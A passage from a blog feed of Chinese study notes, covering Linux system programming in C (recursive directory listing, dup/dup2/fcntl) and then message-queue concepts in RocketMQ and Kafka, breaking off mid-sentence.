&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s:\n"</span>, path);</span><br><span class="line"></span><br><span class="line">        DIR *dirp;</span><br><span class="line">dirp = opendir(path);</span><br><span class="line">        <span class="keyword">if</span> (!dirp) &#123;    <span class="comment">// dirp == NULL</span></span><br><span class="line">            perror(<span class="string">"opendir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">direntry</span>;</span></span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((direntry = readdir(dirp))!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(direntry-&gt;d_name,<span class="string">"."</span>)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(direntry-&gt;d_name,<span class="string">".."</span>)==<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (direntry-&gt;d_type != DT_DIR)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s  "</span>, direntry-&gt;d_name);       <span class="comment">// 第一次打开，输出所有的文件名</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!direntry &amp;&amp; errno) &#123;       <span class="comment">// direntry == NULL &amp;&amp; errno != 0</span></span><br><span class="line">            perror(<span class="string">"readdir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (closedir(dirp) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"closedir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dirp = opendir(path);</span><br><span class="line">        <span class="keyword">if</span> (!dirp) &#123;    <span class="comment">// dirp == NULL</span></span><br><span class="line">            perror(<span class="string">"opendir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((direntry = readdir(dirp))!=<span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(direntry-&gt;d_name,<span class="string">"."</span>)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">strcmp</span>(direntry-&gt;d_name,<span class="string">".."</span>)==<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (direntry-&gt;d_type == DT_DIR)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s  "</span>, direntry-&gt;d_name);   <span class="comment">// 第二次打开，输出所有的目录名</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!direntry &amp;&amp; errno) &#123;       <span class="comment">// direntry == NULL &amp;&amp; errno != 0</span></span><br><span class="line">            perror(<span class="string">"readdir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (closedir(dirp) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"closedir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dirp = opendir(path);</span><br><span class="line">        <span class="keyword">if</span> (!dirp) &#123;    <span class="comment">// dirp == NULL</span></span><br><span class="line">            perror(<span class="string">"opendir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((direntry = readdir(dirp))!=<span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(direntry-&gt;d_name,<span class="string">"."</span>)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(direntry-&gt;d_name,<span class="string">".."</span>)==<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (direntry-&gt;d_type == DT_DIR) &#123;</span><br><span class="line">                <span class="keyword">char</span> new_path[MAX_PATH_SIZE] = <span class="string">""</span>;</span><br><span class="line">                <span class="built_in">strcat</span>(new_path, path);</span><br><span class="line">                <span class="built_in">strcat</span>(new_path, <span class="string">"/"</span>);</span><br><span class="line">                <span class="built_in">strcat</span>(new_path, direntry-&gt;d_name);     <span class="comment">// 拼接好新路径</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">                r_read_dir(new_path);   <span class="comment">// 递归</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!direntry &amp;&amp; errno) &#123;       <span class="comment">// direntry == NULL &amp;&amp; errno != 0</span></span><br><span class="line">            perror(<span class="string">"readdir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (closedir(dirp) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"closedir error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_dir</span><span class="params">(<span class="keyword">char</span>* path)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statbuf</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (stat(path, &amp;statbuf) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"stat error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (S_ISDIR(statbuf.st_mode))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> path[MAX_PATH_SIZE] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)          <span class="comment">// 用户没有输入路径</span></span><br><span class="line">        <span class="built_in">strcat</span>(path, <span class="string">"."</span>);  <span class="comment">// 默认为当前路径</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcat</span>(path, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    r_read_dir(path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现效果和linux原生大差不差</p><p><img src="/2021/09/15/Linux系统编程/2.png" alt="2"></p><h5 id="dup和dup2"><a href="#dup和dup2" class="headerlink" title="dup和dup2"></a>dup和dup2</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int dup(int oldfd);</span><br><span class="line"></span><br><span class="line">oldfd:已有文件描述符</span><br><span class="line">返回：新文件描述符</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line"><span class="keyword">int</span> newfd = dup(fd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"newfd = %d\n"</span>,newfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int dup2(int oldfd,int newfd);</span><br><span class="line"></span><br><span class="line">oldfd:已有文件描述符</span><br><span class="line">newfd：新文件描述符</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd1 = open(argv[<span class="number">1</span>],O_RDWR);</span><br><span class="line"><span class="keyword">int</span> fd2 = open(argv[<span class="number">2</span>],O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fdret = dup2(fd1,fd2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fdret = %d\n"</span>,fdret);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = write(fd2,<span class="string">"1234567"</span>,<span class="number">7</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ret = %d\n"</span>,ret);</span><br><span class="line"></span><br><span class="line">dup2(fd1,STDOUT_FILENO);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------------test\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="fcntl函数实现dup"><a href="#fcntl函数实现dup" class="headerlink" title="fcntl函数实现dup"></a>fcntl函数实现dup</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int fcntl(int fd,int cmd,...)</span><br><span class="line"></span><br><span class="line">cmd: F_DUPFD</span><br><span class="line">参3: 被占用的，返回最小可用的。未被占用的，返回=该值的文件描述符</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Shell&quot;&gt;&lt;a href=&quot;#Shell&quot; class=&quot;headerlink&quot; title=&quot;Shell&quot;&gt;&lt;/a&gt;Shell&lt;/h4&gt;&lt;p&gt;命令解释器，根据舒服的命令执行相应命令&lt;/p&gt;
&lt;p&gt;查看当前系统下有哪些shell&lt;/p&gt;
&lt;figure cla
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>消息队列总结</title>
    <link href="elssm.github.io/2021/09/14/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%80%BB%E7%BB%93/"/>
    <id>elssm.github.io/2021/09/14/消息队列总结/</id>
    <published>2021-09-14T00:13:35.000Z</published>
    <updated>2021-09-17T13:00:06.458Z</updated>
    
    <content type="html"><![CDATA[<h4 id="消息队列MQ"><a href="#消息队列MQ" class="headerlink" title="消息队列MQ"></a>消息队列MQ</h4><p>中间件：位于操作系统之上，客户应用系统之下的中间层，针对某些特定的领域抽取他们的共性部分独立出来的一套组件，称之为中间件。目的是为了进一步简化应用系统的开发，避免重复劳动。</p><ul><li>消息队列系统传输的对象是消息，消息如何来表示，即消息格式，比如使用CSV、XML、JSON或是二进制序列。</li><li>消息如何传输，消息在生产者，服务器和消费者之间如何流转，即是传输模型。</li></ul><h5 id="点对点模型"><a href="#点对点模型" class="headerlink" title="点对点模型"></a>点对点模型</h5><p>消息被保存在队列中，一个或多个消费者可以消耗队列中的消息，但是特定消息只能由最多一个消费者消费。一旦消费者读取队列中的消息，该消息就会从队列中消失。</p><h5 id="发布-订阅模型"><a href="#发布-订阅模型" class="headerlink" title="发布/订阅模型"></a>发布/订阅模型</h5><p>该模型有一个Topic的概念，和点对点模型不同的是，该模型可能存在多个发布者向相同的主题发送消息，而订阅者也可能存在多个，他们都能接收到相同主题的消息。</p><h4 id="消息队列的作用"><a href="#消息队列的作用" class="headerlink" title="消息队列的作用"></a>消息队列的作用</h4><ul><li>业务解耦（将频繁变动的非关键业务代码与稳定且关键的业务逻辑代码剥离开来）</li><li>异步调用（下单业务中，同步调用的调用链会很长，响应时间较长，异步调用会提高响应时间）</li><li>削峰填谷（遇到一些类似于双11的大促业务，可以使用MQ承接多的流量，之后再通过机器去MQ中拉取消息处理业务）</li><li>信息汇聚（大数据场景下，多数据源将各自产生的数据集中收拢到消息中间件，然后再由下游清洗和消费）</li><li>数据同步管道（用于同步数据变化的场景，例如数据库日志在两个数据库实例间的同步）</li></ul><h4 id="RocketMQ"><a href="#RocketMQ" class="headerlink" title="RocketMQ"></a>RocketMQ</h4><p>生产者：消息发布的角色，支持分布式集群方式部署，通过MQ的负载均衡模块（SDK）选择相应的Broker集群队列进行消息投递，投递的过程支持快速失败并且低延迟。</p><p>服务端NameServer：元数据管理中心，类似于Zookeeper，支持Broker的动态注册与发现，以及Topic的路由注册。NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据，然后提供心跳检测机制，检查Broker是否还存活。每个NameServer将保存关于Broker集群的整个路由信息和用于客户端查询的队列信息，然后Producer和Consumer通过NameServer就可以知道整个Broker集群的路由信息。从而进行 消息的投递和消费。Broker向每一台NameServer注册自己的路由信息，所以当某一个NameServer下线之后，Broker仍然可以向其他NameServer同步其路由信息。</p><p>Broker服务实例：负责消息的投递、存储和查询以及服务高可用保证。Broker下的子模块</p><ul><li>Remoting Moudle：整个Broker的实体，负责处理来自客户端的请求。</li><li>Client Manager：负责管理客户端和维护Consumer的Topic订阅信息。</li><li>Store Service：提供方便简单的API接口处理消息存储到无力硬盘和查询功能</li><li>HA Service：高可用服务，提供Master Broker和Slaver Broker之间的数据同步功能</li><li>Index Service：根据特定的Message Key对投递到Broker的消息进行索引服务，以提供消息的快速查询。</li></ul><p>消费者：支持分布式集群方式部署，支持长轮询模式对消息进行消费，同时也支持集群方式和广播方式的消费，以及实时消息订阅机制。</p><h4 id="RocketMQ集群工作流程"><a href="#RocketMQ集群工作流程" class="headerlink" title="RocketMQ集群工作流程"></a>RocketMQ集群工作流程</h4><ul><li>启动NameServer，监听端口，等待Broker、Producer和Consumer连接。</li><li>Broker启动，跟所有的NameServer保持长连接，定时发送心跳包。</li><li>收发消息前，先创建Topic，创建时需要指定该Topic要存储在哪些Broker上，也可以在发送消息时自动创建Topic。</li><li>Producer发送消息，启动时先跟NameServer集群中的其中一台建立长连接，并默认每隔30秒从NameServer中拉取Topic路由信息TopicPublishInfoTable，缓存到本地，从TopicPublishInfoTable中获取当前发送的Topic存在哪些Broker上，轮询从队列列表中选择一个队列，然后与队列所在的Broker建立长连接从而向Broker发消息。Broker作为消息的接收者接收消息并落盘存储。</li><li>Consumer跟Producer类似，跟其中一台NameServer建立长连接，获取当前订阅Topic存在哪些Broker上，然后直接跟Broker建立连接通道，通过客户端负载均衡机制选择某一个或者几个消息队列来拉取消息进行消费。这里的拉取其实是兼顾拉（pull）和推（push）的长轮询模式（long polling），即首先消费者客户端向Broker发出拉取请求，如果Broker上的相应队列有数据，则拉取该数据；如果没有，则Broker作为服务端会hold该拉取请求30s，30s内有数据，则数据返回本次请求结束；如果30s内没有数据，则timeout，该请求结束，客户端立即发起下一次请求。</li></ul><h4 id="消费端负载均衡算法"><a href="#消费端负载均衡算法" class="headerlink" title="消费端负载均衡算法"></a>消费端负载均衡算法</h4><ul><li>平均分配算法</li><li>hash一致性算法</li><li>按机房分配算法</li><li>自定义算法</li></ul><p>默认的是消息队列的平均分配算法，类似于分页的算法，将所有MessageQueue排好序类似于记录，将所有消费端Consumer排好序类似页数，并求出每一页需要包含的平均size和每个页面记录的范围range，最后遍历整个range而计算出当前Consumer端应该分配到的记录。</p><h4 id="RocketMQ的rebalance"><a href="#RocketMQ的rebalance" class="headerlink" title="RocketMQ的rebalance"></a>RocketMQ的rebalance</h4><p>Consumer在消费过程中是会连上具体的Broker server的，而且会定期上报心跳，因此Broker上是有全量的Consumer信息的，Consumer客户端可以拉取到整体有多少个Consumer节点，自己的排序情况如何；同时Consumer也能从Broker上拉取它所订阅的Topic全量的MessageQueue信息即总size。总size除以Consumer节点数就得到每页（每个）Consumer应该分配的MessageQueue。Broker定时会主动触发检查Topic的MessageQueue数量是否发生变化，如果变化则会触发为每个Consumer节点重新分配MessageQueue的计算。</p><h4 id="RocketMQ的存储机制"><a href="#RocketMQ的存储机制" class="headerlink" title="RocketMQ的存储机制"></a>RocketMQ的存储机制</h4><ul><li>CommitLog：日志数据文件，即消息主体以及元数据的存储主体，由Broker来创建，它解决了消息存哪里的问题。生产者（Producer）通过API发送消息到Broker端，首先会以顺序写的方式追加到一个名为CommitLog的文件末尾。这里的CommitLog文件就是真正存储消息本身的地方。默认一个CommitLog文件为1G大小，这是为了避免一个过大文件存储所有消息，导致读和写的效率低下。一个Broker实例下所有的Topic队列共用一个（组）CommitLog来存储消息</li><li>ConsumeQueue，即逻辑消费队列，可以等同的理解为前文中提到的逻辑分片messageQueue。它解决队列怎么存，消费者如何消费的问题。一个Topic会以多个ConsumeQueue的形式来存储（默认是4），Consumequeue以文件形式存储，采取定长设计，每一个条目共20个字节，分别为8字节的commitlog物理偏移量（commitLogOffset）、4字节的消息长度（msgSize）、8字节tag hashcode，单个文件由30W个条目组成，可以像数组一样随机访问每一个条目，每个ConsumeQueue文件大小约5.72M。因此，我们可以看出ConsumeQueue没有重复存储消息本身，而是作为消息的索引，帮助Consumer来查找待消费的数据。只要有了物理偏移量（commitLogOffset）和消息长度（msgSize），消费者就完全可以从CommitLog中读到它想要消费的信息了。</li><li>IndexFile: 即索引文件，Broker在创建ConsumeQueue的同时也会创建IndexFile，它用于解决性能问题。它提供了一种可以通过Key或时间区间来查询消息的方法。</li><li>miniOffset，consumerOffset和maxOffset，用于解决如何消费的问题。</li></ul><h4 id="RocketMQ消息刷盘机制"><a href="#RocketMQ消息刷盘机制" class="headerlink" title="RocketMQ消息刷盘机制"></a>RocketMQ消息刷盘机制</h4><ul><li><p>同步刷盘：只有在消息真正持久化至磁盘后RocketMQ的Broker端才会返回给Producer端一个成功的ACK响应。同步刷盘对MQ消息可靠性来说是一种不错的保障，但是性能上会有较大影响，要谨慎使用，一般适用于金融业务。</p></li><li><p>异步刷盘：能够充分利用OS的页缓存（PageCache）的优势，只要消息写入PageCache即可将成功的ACK返回给Producer端。消息刷盘采用后台异步线程提交的方式进行，降低了读写延迟，提高了MQ的性能和吞吐量。</p></li></ul><h4 id="幂等处理"><a href="#幂等处理" class="headerlink" title="幂等处理"></a>幂等处理</h4><p>在编程中，一个幂等操作的特点是其任意多次执行所产生的影响均与一次执行的影响相同。幂等函数，或幂等方法，是指可以使用相同参数重复执行，并能获得相同结果的函数。这些函数不会影响系统状态，也不用担心重复执行会对系统造成改变。</p><p>实现幂等性的技术方案</p><ul><li>查询操作：select是天然的幂等操作</li><li>删除操作</li><li>唯一索引，防止新增脏数据</li><li>token机制，防止页面重复提交</li><li>悲观锁</li><li>乐观锁</li><li>分布式锁</li></ul><h4 id="2PC（两阶段提交协议）https-segmentfault-com-a-1190000012534071"><a href="#2PC（两阶段提交协议）https-segmentfault-com-a-1190000012534071" class="headerlink" title="2PC（两阶段提交协议）https://segmentfault.com/a/1190000012534071"></a>2PC（两阶段提交协议）<a href="https://segmentfault.com/a/1190000012534071" target="_blank" rel="noopener">https://segmentfault.com/a/1190000012534071</a></h4><p>两阶段提交协议的目标在于为分布式系统保证数据的一致性，许多分布式系统采用该协议提供对分布式事务的支持。顾名思义，该协议将一个分布式的事务过程拆分成两个阶段： 投票和事务提交 。为了让整个数据库集群能够正常的运行，该协议指定了一个 协调者 单点，用于协调整个数据库集群各节点的运行。为了简化描述，我们将数据库集群中的各个节点称为 参与者 ，三阶段提交协议中同样包含协调者和参与者这两个角色定义</p><p>第一阶段：投票</p><p>该阶段的主要目的在于打探数据库集群中的各个参与者是否能够正常的执行事务</p><ul><li>协调者向所有的参与者发送事务执行请求，并等待参与者反馈事务执行结果；</li><li>事务参与者收到请求之后，执行事务但不提交，并记录事务日志；</li><li>参与者将自己事务执行情况反馈给协调者，同时阻塞等待协调者的后续指令。</li></ul><p>第二阶段：事务提交</p><p>经过第一阶段协调者的询盘之后，各个参与者会回复自己事务的执行情况，这时候存在 3 种可能性</p><ul><li><p>所有的参与者都回复能够正常执行事务。</p><p>处理如下</p><ul><li>协调者向各个参与者发送 commit 通知，请求提交事务；</li><li>参与者收到事务提交通知之后执行 commit 操作，然后释放占有的资源；</li><li>参与者向协调者返回事务 commit 结果信息。</li></ul></li><li><p>一个或多个参与者回复事务执行失败。</p><p>处理如下</p><ul><li>协调者向各个参与者发送事务 rollback 通知，请求回滚事务；</li><li>参与者收到事务回滚通知之后执行 rollback 操作，然后释放占有的资源；</li><li>参与者向协调者返回事务 rollback 结果信息。</li></ul></li><li><p>协调者等待超时。</p><p>处理如下</p><ul><li>协调者向各个参与者发送事务 rollback 通知，请求回滚事务；</li><li>参与者收到事务回滚通知之后执行 rollback 操作，然后释放占有的资源；</li><li>参与者向协调者返回事务 rollback 结果信息。</li></ul></li></ul><h4 id="Kafka（消息引擎系统）"><a href="#Kafka（消息引擎系统）" class="headerlink" title="Kafka（消息引擎系统）"></a>Kafka（消息引擎系统）</h4><p>传输模型</p><ul><li>点对点模型</li><li>发布/订阅模型</li></ul><p>体系结构</p><ul><li><p>Producer</p></li><li><p>Consumer</p></li><li><p>Broker：服务代理节点</p></li><li><p>Topic</p></li><li><p>Partition</p></li><li><p>Offset</p><p>一个topic有多个Partition，一个Partition又会有多个Replica，一个Replica中记录的是Log，Log又可以被分为多个LogSegment，LogSegment包含<code>.log</code>、<code>.index</code>、<code>.timeindex</code>等文件</p></li></ul><p>Kafka的多副本机制</p><ul><li>同一分区的不同副本中保存的是相同的消息，副本之间是“一主多从”的关系</li></ul><p>Kafka的主要场景还是在消息引擎而不是以数据存储的方式对外提供读服务，通常设计频繁的生产消息和消费消息，这不属于典型的读多写少场景，因此读写分离不适合kafka。</p><ul><li>AR（Assigned Replicas）：分区中的所有副本</li><li>ISR（In-Sync Replicas）：所有与leader副本保持一定程度同步的副本（包括leader副本）</li><li>OSR（Out-of-Sync Replicas）：与leader副本同步滞后过多的副本</li><li>HW（High watermark）：高水位，标识了一个特定的消息偏移量，消费者只能拉取到这个offset之前的消息</li><li>LEO（Log End Offset）：标识当前日志文件中下一条待写入消息的offset</li></ul><p>Kafka的三层消息架构：</p><ul><li>第一层是主题层，每个主题可以配置 M 个分区，而每个分区又可以配置 N 个副本。</li><li>第二层是分区层，每个分区的 N 个副本中只能有一个充当领导者角色，对外提供服务；其他 N-1 个副本是追随者副本，只是提供数据冗余之用。</li><li>第三层是消息层，分区中包含若干条消息，每条消息的位移从 0 开始，依次递增。</li></ul><p>Kafka的分区策略</p><ul><li>轮询策略（Round-robin）</li><li>随机策略（Randomness）</li><li>按消息键保存策略</li></ul><p>Rebalance的触发条件</p><ul><li>组成员数发生变更。比如有新的 Consumer 实例加入组或者离开组，抑或是有 Consumer 实例崩溃被“踢出”组。</li><li>订阅主题数发生变更。Consumer Group 可以使用正则表达式的方式订阅主题，比如 consumer.subscribe(Pattern.compile(“t.*c”)) 就表明该 Group 订阅所有以字母 t 开头、字母 c 结尾的主题。在 Consumer Group 的运行过程中，你新创建了一个满足这样条件的主题，那么该 Group 就会发生 Rebalance。</li><li>订阅主题的分区数发生变更。Kafka 当前只能允许增加一个主题的分区数。当分区数增加时，就会触发订阅该主题的所有 Group 开启 Rebalance。</li></ul><p>位移主题：_consumer_offsets是kafka的内部主题，也被称为位移主题，即Offsets Topic。</p><p>老版本Consumer的位移管理依托于ZooKeeper，它会自动或手动的将位移数据提交到ZooKeeper中保存，当Consumer重启后，它能自动从ZooKeeper中读取位移数据，从而在上次消费截止的地方继续消费。ZooKeeper的缺点时不适用于高频的写操作。</p><p>新版本Consumer的位移管理很简单，就是将Consumer的位移数据作为一条条普通的Kafka消息，提交到_consumer_offsets中，可以说，_consumer_offsets的主要作用是保存Kafka消费者的位移信息，要求这个提交过程不仅要支持高持久性，还要支持高频的写操作。</p><p>kafka consumer多线程方案</p><ul><li>消费者程序启动多个线程，每个线程维护专属的 KafkaConsumer 实例，负责完整的消息获取、消息处理流程。</li><li>消费者程序使用单或多线程获取消息，同时创建多个消费线程执行消息处理逻辑。获取消息的线程可以是一个，也可以是多个，每个线程维护专属的 KafkaConsumer 实例，处理消息则交由特定的线程池来做，从而实现消息获取与消息处理的真正解耦。</li></ul><p>副本机制的好处</p><ul><li>提供数据冗余。即使系统部分组件失效，系统依然能够继续运转，因而增加了整体可用性以及数据持久性。</li><li>提供高伸缩性。支持横向扩展，能够通过增加机器的方式来提升读性能，进而提高读操作吞吐量。</li><li>改善数据局部性。允许将数据放入与用户地理位置相近的地方，从而降低系统延时。</li></ul><p>Kafka的Leader-based副本机制</p><ul><li>在 Kafka 中，副本分成两类：领导者副本（Leader Replica）和追随者副本（Follower Replica）。每个分区在创建时都要选举一个副本，称为领导者副本，其余的副本自动称为追随者副本。</li><li>在 Kafka 中，追随者副本是不对外提供服务的。这就是说，追随者副本不处理客户端请求，它唯一的任务就是从领导者副本异步拉取消息，并写入到自己的提交日志中，从而实现与领导者副本的同步。</li><li>领导者副本挂掉了，或者说领导者副本所在的 Broker 宕机时，Kafka 依托于 ZooKeeper 提供的监控功能能够实时感知到，并立即开启新一轮的领导者选举，从追随者副本中选一个作为新的领导者。老 Leader 副本重启回来后，只能作为追随者副本加入到集群中。</li></ul><p>Read-your-writes：这里指当你使用生产者API向Kafka成功写入消息后，马上使用消费者API去读取刚才生产的消息。</p><p>Monotonic Reads（单调读）：对于一个消费者用户而言，在多次消费消息时，他不会看到某条消息一会存在一会不存在。如果第一次读到的是leader副本的消息，第二次可能读到follow副本的消息。而此时follow副本还没有同步leader副本中的消息。</p><p>Unclean领导者选举：通常来说，非同步副本落后 Leader 太多，因此，如果选择这些副本作为新 Leader，就可能出现数据的丢失。毕竟，这些副本中保存的消息远远落后于老 Leader 中的消息。在 Kafka 中，选举这种副本的过程称为 Unclean 领导者选举。开启 Unclean 领导者选举可能会造成数据丢失，但好处是，它使得分区 Leader 副本一直存在，不至于停止对外提供服务，因此提升了高可用性。反之，禁止 Unclean 